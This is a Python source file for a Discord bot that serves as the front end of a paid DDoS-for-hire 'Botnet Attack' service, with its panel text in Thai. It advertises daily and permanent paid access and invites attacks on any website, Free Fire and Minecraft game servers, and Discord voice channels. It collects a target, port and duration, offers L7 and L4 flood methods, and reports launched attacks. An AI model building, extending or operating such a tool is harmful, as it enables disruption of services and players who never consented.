# ui_v2.py
import discord
from discord import ui
from config import (
    EMOJI_HEADER, EMOJI_CONTACT, EMOJI_ALLOWED, EMOJI_BUTTON,
    L7_EMOJI, L4_EMOJI, CUSTOM_EMOJI, L7_METHODS, L4_METHODS,
)

# ── V2 flags ──
V2_FLAGS = discord.MessageFlags.components_v2


def _wrap(view) -> dict:
    """ห่อ LayoutView เป็น dict สำหรับ **kwargs"""
    return {"view": view, "flags": V2_FLAGS}


# ═══════════════════════════════════════════
# Panel
# ═══════════════════════════════════════════
def build_panel() -> dict:
    v = ui.LayoutView(timeout=None)
    c = ui.Container()
    c.add_item(ui.TextDisplay(f"# {EMOJI_HEADER} **Botnet Attack**"))
    c.add_item(ui.TextDisplay(
        f"{EMOJI_CONTACT} **สนใจติดต่อ Tk มาเลยค้าบ วันละ 40 / ถาวร 300 TH**"))
    c.add_item(ui.Separator())
    c.add_item(ui.TextDisplay(
        "**กฎการใช้**\nห้ามยิง Local IP `127.0.0.1` อย่างเดียวพออ"))
    c.add_item(ui.Separator())
    c.add_item(ui.TextDisplay(
        f"{EMOJI_ALLOWED} **Ddos ได้**\n"
        "เว็บอะไรก็ได้นอกจากเว็บต้องห้าม\n\n"
        "เซิร์ฟ ฟีฟาย\nเซิร์ฟ มายคราฟ\nห้องเสียงDiscord"))
    c.add_item(ui.ActionRow().add_item(PanelButton()))
    v.add_item(c)
    return _wrap(v)


class PanelButton(ui.Button):
    def __init__(self):
        super().__init__(label="", style=discord.ButtonStyle.secondary,
                         custom_id="panel_req", emoji=EMOJI_BUTTON)

    async def callback(self, interaction):
        from bot import open_attack_modal
        await open_attack_modal(interaction)


# ═══════════════════════════════════════════
# Modal
# ═══════════════════════════════════════════
class AttackModal(ui.Modal, title="Botnet Attack"):
    target = ui.TextInput(label="Target IP / URL",
                          placeholder="example.com หรือ 1.2.3.4",
                          required=True, max_length=200)
    port = ui.TextInput(label="Port", placeholder="65535",
                        required=True, max_length=5)
    duration = ui.TextInput(label="Time (max 350s)", placeholder="300",
                            required=True, max_length=3)

    async def on_submit(self, interaction):
        from bot import handle_attack_submit
        await handle_attack_submit(interaction, self)


# ═══════════════════════════════════════════
# Category
# ═══════════════════════════════════════════
class CatButton(ui.Button):
    def __init__(self, label, key, uid, target, port, dur, style, emoji):
        super().__init__(label=label, style=style,
                         custom_id=f"cat_{key}", emoji=emoji)
        self.key = key
        self.uid = uid
        self.target = target
        self.port = port
        self.dur = dur

    async def callback(self, interaction):
        if interaction.user.id != self.uid:
            await interaction.response.send_message(
                "ไม่ใช่คำสั่งของมึง", ephemeral=True)
            return
        from bot import show_method_panel
        await show_method_panel(interaction, self.key,
                                self.target, self.port, self.dur)


def build_category_view(uid, target, port, dur) -> dict:
    v = ui.LayoutView(timeout=300)
    c = ui.Container()
    c.add_item(ui.TextDisplay("# เลือกหมวดการยิง"))
    c.add_item(ui.TextDisplay(
        f"```\n[+] Target : {target}\n[+] Port   : {port}\n"
        f"[+] Time   : {dur}s\n```"))

    row1 = ui.ActionRow()
    row1.add_item(CatButton("L7 (เว็บ)", "l7", uid, target, port, dur,
                            discord.ButtonStyle.primary, CUSTOM_EMOJI["HTTPS-BYPASS"]))
    row1.add_item(CatButton("L4 (เกม)", "l4", uid, target, port, dur,
                            discord.ButtonStyle.danger, CUSTOM_EMOJI["HTTPS-BYPASS"]))
    c.add_item(row1)

    row2 = ui.ActionRow()
    row2.add_item(CatButton("Custom L7", "custom_l7", uid, target, port, dur,
                            discord.ButtonStyle.secondary, CUSTOM_EMOJI["HTTPS-BYPASS"]))
    row2.add_item(CatButton("VC Discord", "vc", uid, target, port, dur,
                            discord.ButtonStyle.success, CUSTOM_EMOJI["VC-DISCORD"]))
    row2.add_item(CatButton("Free Fire", "ff", uid, target, port, dur,
                            discord.ButtonStyle.success, CUSTOM_EMOJI["FREEFIRE"]))
    c.add_item(row2)

    v.add_item(c)
    return _wrap(v)


# ═══════════════════════════════════════════
# Method
# ═══════════════════════════════════════════
class MethodButton(ui.Button):
    def __init__(self, method, emoji, uid, target, port, dur, style):
        super().__init__(label=method, style=style,
                         custom_id=f"m_{method}", emoji=emoji)
        self.method = method
        self.uid = uid
        self.target = target
        self.port = port
        self.dur = dur

    async def callback(self, interaction):
        if interaction.user.id != self.uid:
            await interaction.response.send_message(
                "ไม่ใช่คำสั่งของมึง", ephemeral=True)
            return
        from bot import fire_attack
        await fire_attack(interaction, self.method, self.target,
                          self.port, self.dur)


def _rows(methods, emoji_map, uid, target, port, dur, style, per=5):
    rows = []
    for i in range(0, len(methods), per):
        row = ui.ActionRow()
        for m in methods[i:i+per]:
            row.add_item(MethodButton(m, emoji_map.get(m), uid,
                                       target, port, dur, style))
        rows.append(row)
    return rows


def build_method_view(cat, uid, target, port, dur) -> dict:
    v = ui.LayoutView(timeout=300)
    c = ui.Container()

    if cat == "l7":
        title = "# L7 Methods — เลือก method"
        methods, emap, style = L7_METHODS, L7_EMOJI, discord.ButtonStyle.primary
    elif cat == "l4":
        title = "# L4 Methods — เลือก method"
        methods, emap, style = L4_METHODS, L4_EMOJI, discord.ButtonStyle.danger
    elif cat == "custom_l7":
        title = "# Custom L7 Methods"
        methods = ["HTTPS-BYPASS", "HTTPS", "DDOS-BROWSER", "TLS"]
        emap, style = CUSTOM_EMOJI, discord.ButtonStyle.secondary
    elif cat == "vc":
        title = "# VC Discord Flood"
        methods, emap, style = ["VC-DISCORD"], CUSTOM_EMOJI, discord.ButtonStyle.success
    else:
        title = "# Free Fire Flood"
        methods, emap, style = ["FREEFIRE"], CUSTOM_EMOJI, discord.ButtonStyle.success

    c.add_item(ui.TextDisplay(title))
    c.add_item(ui.TextDisplay(
        f"```\n[+] Target : {target}\n[+] Port   : {port}\n"
        f"[+] Time   : {dur}s\n```"))
    for r in _rows(methods, emap, uid, target, port, dur, style):
        c.add_item(r)
    v.add_item(c)
    return _wrap(v)


# ═══════════════════════════════════════════
# Running
# ═══════════════════════════════════════════
def build_running(method, target, port, left, total, speed, hits=0) -> dict:
    v = ui.LayoutView(timeout=None)
    c = ui.Container()
    c.add_item(ui.TextDisplay("# Attack Launched Successfully"))
    c.add_item(ui.TextDisplay(
        f"```\n"
        f"[+] Method    : {method}\n"
        f"[+] Target    : {target}\n"
        f"[+] Port      : {port}\n"
        f"[+] Time      : {left}s / {total}s\n"
        f"[+] Speed     : {speed}\n"
        f"[+] Hits      : {hits}\n"
        f"[+] Cooldown  : {'Running' if left > 0 else 'Ready'}\n"
        f"[+] Slot      : 0/1\n"
        f"```"))
    v.add_item(c)
    return _wrap(v)